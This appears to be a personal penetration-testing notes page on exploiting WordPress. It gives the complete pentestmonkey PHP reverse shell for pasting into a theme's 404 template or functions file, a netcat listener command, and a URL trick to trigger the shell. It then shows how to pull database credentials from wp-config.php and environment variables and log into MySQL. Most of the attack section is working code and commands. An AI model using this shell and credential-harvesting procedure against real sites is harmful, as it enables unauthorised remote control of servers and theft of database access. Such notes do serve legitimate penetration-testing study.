---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Wordpress Explotation

## <mark style="color:purple;">Abuse Theme Configuration on templates</mark>&#x20;

This works for version 2021 or less of templates. We can add malicious code to a page theme configurarion, this allows us to get a reverse shell when activating the theme

* From administrator dashboard go to _Tools>Edit Themes_. On the _select theme_ slider select the version _twenty-twenty-one_ or lower. Go to the _404 Template_ tab and you wil see a code like this:

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
 *
 * @package WordPress
 * @subpackage Twenty_Twenty_One
 * @since Twenty Twenty-One 1.0
 */

// AFTER INITIAL COMMENT (HERE) GOES THE SCRIPT FOR REVERSE SHELL

get_header();
?>
...
```
{% endcode %}

***

* Put the content of this script in the space show above

{% code title="phpRevShell.php" overflow="wrap" lineNumbers="true" fullWidth="false" %}
```php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '';  // Put your IP between the quotes
  $port = ;  // Put your port here
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit("ERROR: Can't fork");
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
    }

    $daemon = 1;
  } else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
  }

  // Change to a safe directory
  chdir("/");

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
    2 => array("pipe", "w")   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won't
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit("Successfully opened reverse shell to $ip:$port");

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit("ERROR: Shell connection terminated");
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit("ERROR: Shell process terminated");
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we've daemonised ourself
  // (I can't figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print "$string
";
    }
  }  
```
{% endcode %}

{% hint style="info" %}
Remember to specify host machine IP and port on lines 6 and 7
{% endhint %}

***

* Click on _Update File_ button, go to _Appareance>Themes_ and activate the theme that have been modified. Then create a _netcat_ listener in the host machine

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc -nlvp $port #The port that has been specificated in the script
```
{% endcode %}

***

* Visit the site and search for and url that does not exist

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$URL/p=1 #This is the homepage
#This page doesn't exist
http://$URL/p=10 #This will give the shell on the host machine
```
{% endcode %}

***

{% hint style="warning" %}
All this process can also be done on Templates version 2022 or higher. Instead of modifying _404 Template_ we will modify the _Theme Functions_ file. This will give us the shell everytime we enter to a page of the web but **WILL BREAK THE SITE ENTIRELY.**
{% endhint %}

***



## <mark style="color:purple;">Getting credentials from configuration files</mark>&#x20;

Once you have gain a shell to the machine, we can search for credentials for mysql in the configuration files of wordpress

* Go to `/var/www/html` (default folder for server) and list elements

{% code overflow="wrap" lineNumbers="true" %}
```bash
cd /var/www/html
ls -a
#Exple output
.htaccess  index.php  wp-admin  wp-config-docker.php  wp-config.php  wp-content
wp-cron.php  wp-includes  wp-load.php  wp-login.php  wp-settings.php  xmlrpc.php
```
{% endcode %}

***

* See contetn of wp-config.php nad search for credential

<pre class="language-php" data-overflow="wrap" data-line-numbers><code class="lang-php">cat wp-config.php
#Example output
<strong>...
</strong>/** Database hostname */
define( 'DB_HOST', getenv_docker('WORDPRESS_DB_HOST', 'mysql') );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', getenv_docker('WORDPRESS_DB_CHARSET', 'utf8') );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', getenv_docker('WORDPRESS_DB_COLLATE', '') );
...
</code></pre>

{% hint style="info" %}
getenv\_docker() is saying us that the credentials are environment variables on the container
{% endhint %}

***

* Check enviroment variables to obtain the credentials to the database

{% code overflow="wrap" lineNumbers="true" %}
```bash
env
#Example output
...
WORDPRESS_DB_PASSWORD=wordpress
WORDPRESS_DB_HOST=db
WORDPRESS_DB_USER=wordpress
...
```
{% endcode %}

***

* Access the database with mysql and the credentials we have got

{% code overflow="wrap" lineNumbers="true" %}
```bash
mysql -u $user -h $host -p   #u for user, h for host and p to ask for password
```
{% endcode %}

***

